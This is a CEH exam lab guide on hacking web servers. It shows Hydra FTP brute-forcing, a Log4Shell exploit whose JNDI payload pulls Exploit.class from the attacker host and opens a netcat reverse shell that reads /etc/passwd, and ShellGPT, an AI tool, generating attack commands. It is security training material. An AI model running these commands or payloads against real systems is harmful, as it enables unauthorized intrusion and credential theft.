# Module 13: Hacking Web Servers - Lab Guide

## Tools Used & Purpose

- **Netcraft / WhatWeb**: Identifying web server software, operating systems, module versions, and underlying web infrastructure.
- **Telnet / Netcat**: Direct socket banner grabbing (`HEAD / HTTP/1.0`) to confirm web server versions and default headers.
- **Nmap**: Web port scanning (80, 443, 8080) and running web server enumeration NSE scripts (`http-enum`, `http-headers`).
- **WAFW00F**: Probing and fingerprinting Web Application Firewalls (WAF) protecting the target web server.
- **THC Hydra**: Network authentication brute-forcing against web server management protocols (HTTP Basic/Digest, FTP, SSH, RDP).
- **Log4Shell PoC (`poc.py`)**: Demonstrating Remote Code Execution (RCE) on vulnerable Java/Log4j web server infrastructure.
- **ShellGPT (`sgpt`)**: Automating web server footprinting, header extraction, and vulnerability validation using natural language prompts.
- **HTTrack**: Offline web mirroring tool used to download complete website directories and reveal hidden developer files and comments.
- **Nikto / Syhunt Hybrid**: Scanning web servers for common misconfigurations, default files, and vulnerable scripts.
- **GFI LanGuard**: Performing network-level vulnerability assessment and configuration audits on web servers.

---

## 5. Hands-On Practical Labs Walkthrough

### Lab 1: Footprint the Web Server

#### Task 1: Footprint a Web Server using Information Gathering Tools

- <b>Environment:</b>
  - Attacking System: Parrot Security (<code>10.10.1.13</code>).
  - Target Web Server: Public / Lab Domain <code>www.moviescope.com</code> (<code>10.10.1.22</code>).
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Execute Web-Based Discovery via Netcraft:</b>
     - Launch Chromium / Firefox on Parrot Security and navigate to <code>https://www.netcraft.com</code>.
     - In the site search box, query <code>www.moviescope.com</code> to inspect hosting history, netblock owner, web server software, and historical IP changes.
  2. <b>Fingerprint Web Technologies via WhatWeb:</b>
     - Open Terminal on Parrot Security and execute WhatWeb:
       ```bash
       whatweb www.moviescope.com
       ```
     - Observe output identifying web server (<code>Microsoft-IIS/10.0</code>), [ASP.NET](http://ASP.NET) version (<code>4.0.30319</code>), and IP (<code>10.10.1.22</code>).
  3. <b>Execute Banner Grabbing via Telnet:</b>
     - Connect to target web server on port 80:
       ```bash
       telnet www.moviescope.com 80
       ```
     - Issue raw HTTP command:
       ```javascript
       GET / HTTP/1.0
       ```
     - Press <code>Enter</code> twice; observe returned HTTP response headers disclosing <code>Server: Microsoft-IIS/10.0</code> and <code>X-Powered-By: ASP.NET</code>.

---

#### Task 2: Footprint a Web Server using Nmap and WAFW00F

- <b>Environment:</b>
  - Attacking System: Parrot Security (<code>10.10.1.13</code>).
  - Target: Windows Server 2022 hosting IIS (<code>10.10.1.22</code>).
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Discover Hostnames Resolving Target Domain:</b>
     - Run Nmap hostmap discovery script:
       ```bash
       nmap --script hostmap-* www.moviescope.com
       ```
  2. <b>Enumerate Supported HTTP Methods & Directories:</b>
     - Run Nmap scripts targeting port 80:
       ```bash
       nmap -p 80 -sV --script http-enum,http-methods 10.10.1.22
       ```
     - Review results detailing supported verbs (<code>OPTIONS</code>, <code>GET</code>, <code>HEAD</code>, <code>POST</code>) and accessible virtual directories (<code>/images</code>, <code>/admin</code>, <code>/login</code>).
  3. <b>Detect & Fingerprint Web Application Firewall via WAFW00F:</b>
     - Execute WAFW00F against the target:
       ```bash
       wafw00f http://www.moviescope.com
       ```
     - Analyze output: WAFW00F transmits anomalous probe requests to trigger WAF responses; reports whether the site is protected by a WAF (e.g., Cloudflare, ModSecurity, Imperva) or exposed directly.

---

### Lab 2: Perform a Web Server Attack

#### Task 1: Crack FTP Credentials using THC Hydra

- <b>Environment:</b>
  - Target Host: Windows 11 (<code>10.10.1.11</code>) running an FTP service.
  - Attacking System: Parrot Security (<code>10.10.1.13</code>).
  - Wordlists: <code>/home/attacker/Desktop/Wordlists/Usernames.txt</code> and <code>Passwords.txt</code>.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Verify FTP Service on Target:</b>
     - Open Terminal on Parrot Security:
       ```bash
       nmap -p 21 10.10.1.11
       ```
     - Confirm port 21 is open and hosting an active FTP daemon.
  2. <b>Launch Dictionary Attack via THC Hydra:</b>
     - Execute Hydra command targeting the FTP service:
       ```bash
       hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt 10.10.1.11 ftp
       ```
     - Observe Hydra brute-forcing combinations until valid credentials are discovered: <code>admin</code> / <code>password123</code>.
  3. <b>Establish Unauthorized FTP Session:</b>
     - Connect to target FTP service:
       ```bash
       ftp 10.10.1.11
       ```
     - Provide cracked credentials (<code>admin</code> / <code>password123</code>).
     - Upon successful authentication, create a directory to demonstrate write access:
       ```shell
       mkdir Hacked
       ls
       help
       bye
       ```
     - Confirm compromise of the target file storage subsystem.

---

#### Task 2: Exploit Log4j Vulnerability (Log4Shell CVE-2021-44228)

- <b>Environment:</b>
  - Target Host: Ubuntu VM (<code>10.10.1.9</code>) running vulnerable Log4j web application.
  - Attacking System: Parrot Security (<code>10.10.1.13</code>).
  - Exploit Kit: <code>log4j-shell-poc</code> (Python exploit script <code>poc.py</code>).
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Verify Target Service & Log4j Web Application:</b>
     - Run Nmap scan from Parrot Security:
       ```bash
       nmap -sV -sC 10.10.1.9
       ```
     - Open Firefox and navigate to <code>http://10.10.1.9:8080</code> to access the vulnerable login portal.
  2. <b>Stage Log4j Exploit & Netcat Listener:</b>
     - On Parrot Security, navigate to exploit directory:
       ```bash
       cd log4j-shell-poc/
       ```
     - In a secondary terminal, initiate Netcat listener on port 9001:
       ```bash
       nc -lvp 9001
       ```
  3. <b>Launch Malicious LDAP Referral Server:</b>
     - Run <code>poc.py</code> to start the HTTP class server on port 8000 and LDAP referral server on port 1389:
       ```bash
       python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
       ```
     - Script generates JNDI payload string:
       ```txt
       Send me: ${jndi:ldap://10.10.1.13:1389/a}
       ```
  4. <b>Inject Payload & Trigger Remote Code Execution:</b>
     - Switch to Firefox at <code>http://10.10.1.9:8080</code>.
     - In the <b>Username</b> field, paste <code>${jndi:ldap://10.10.1.13:1389/a}</code>.
     - Enter any password and click <b>Login</b>.
     - Observe LDAP server receiving query from <code>10.10.1.9</code> and directing it to download the compiled Java exploit from <code>http://10.10.1.13:8000/Exploit.class</code>.
  5. <b>Capture Reverse Shell & Confirm Root Compromise:</b>
     - Switch to Netcat listener terminal; observe incoming reverse TCP shell:
       ```bash
       id
       whoami
       cat /etc/passwd
       ```
     - Command execution confirms successful unauthenticated Remote Code Execution (RCE) via Log4Shell.

---

### Lab 3: Perform Web Server Hacking using AI

#### Task 1: Perform Web Server Footprinting and Attacks using ShellGPT

- <b>Environment:</b>
  - Attacking System: Parrot Security (<code>10.10.1.13</code>) with ShellGPT (<code>sgpt</code>) installed.
  - Targets: Windows 11 (<code>10.10.1.11</code>), Windows Server 2022 (<code>10.10.1.22</code>), <code>www.certifiedhacker.com</code>.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Automated Banner Grabbing via Natural Language:</b>
     - Prompt ShellGPT to construct and execute Netcat banner grabbing:
       ```bash
       sgpt --shell "Perform web server footprinting on target IP 10.10.1.22 using Netcat by sending an HTTP request and saving the headers to headers.txt"
       ```
     - Review generated shell command, approve execution (<code>[E]xecute</code>), and inspect saved <code>headers.txt</code>.
  2. <b>Automated FTP Brute-Force Orchestration:</b>
     - Instruct ShellGPT to generate Hydra brute-force command:
       ```bash
       sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using user list /home/attacker/Desktop/Wordlists/Usernames.txt and password list /home/attacker/Desktop/Wordlists/Passwords.txt"
       ```
     - ShellGPT formulates optimal command syntax; execute and review cracked credentials.
  3. <b>Automated Web Server Mirroring:</b>
     - Execute website cloning via ShellGPT:
       ```bash
       sgpt --shell "Mirror the website www.certifiedhacker.com using httrack and save it in certifiedhacker.com folder"
       ```
     - Approve execution; navigate to mirrored local folder to inspect offline site structure and assets.

## 6. High-Frequency Exam Indicators & Key Memory Anchors

```javascript
+----------------------------------------------------------------------------------------------------+
|                                  CEH v13 EXAM CRITICAL FOCUS POINTS                                |
+----------------------------+-----------------------------------------------------------------------+
| Exam Question Theme        | Key Answer / Official EC-Council Exam Concept                         |
+----------------------------+-----------------------------------------------------------------------+
| IIS Architecture           | HTTP.sys operates in KERNEL MODE (receives requests, kernel caching);  |
|                            | w3wp.exe processes run in USER MODE (Application Pools).              |
+----------------------------+-----------------------------------------------------------------------+
| Apache MPM Modules         | prefork (multi-process, non-threaded, safe for non-thread-safe PHP);  |
|                            | worker (multi-process + threaded); event (async non-blocking I/O).    |
+----------------------------+-----------------------------------------------------------------------+
| Nginx Architecture         | Single Master Process (elevated) + Worker Processes (unprivileged,    |
|                            | event-driven, non-blocking asynchronous event loop).                  |
+----------------------------+-----------------------------------------------------------------------+
| Nginx Alias Traversal      | location /i { alias /data/images/; } missing trailing slash allows    |
|                            | /i../ traversal to read arbitrary files from /data.                   |
+----------------------------+-----------------------------------------------------------------------+
| HTTP Response Splitting    | Involves injecting CRLF sequences (\r\n / %0D%0A) to split response   |
|                            | headers, enabling Web Cache Poisoning and cross-user defacement.      |
+----------------------------+-----------------------------------------------------------------------+
| Web Cache Poisoning        | Attacker exploits unkeyed request headers (e.g., X-Forwarded-Host)    |
|                            | to store malicious responses under benign cache keys.                 |
+----------------------------+-----------------------------------------------------------------------+
| Log4j / Log4Shell          | CVE-2021-44228; abuses JNDI lookup syntax ${jndi:ldap://...} logged   |
|                            | by Log4j to execute remote Java class files without authentication.  |
+----------------------------+-----------------------------------------------------------------------+
| Banner Suppressing Syntax  | Apache: ServerTokens Prod & ServerSignature Off.                      |
|                            | Nginx: server_tokens off;                                             |
+----------------------------+-----------------------------------------------------------------------+
| Directory Browsing Disable | Apache: Options -Indexes; IIS: Disable Directory Browsing in Manager.  |
+----------------------------+-----------------------------------------------------------------------+
| Website Mirroring Tools    | HTTrack, GNU Wget (wget -m), BlackWidow clone websites for offline    |
|                            | inspection of hidden comments, scripts, and directory structures.     |
+----------------------------+-----------------------------------------------------------------------+
| Web Vulnerability Scanners | Nikto (-h <host> -C all), Syhunt Hybrid, N-Stalker, QualysGuard.      |
+----------------------------+-----------------------------------------------------------------------+
```
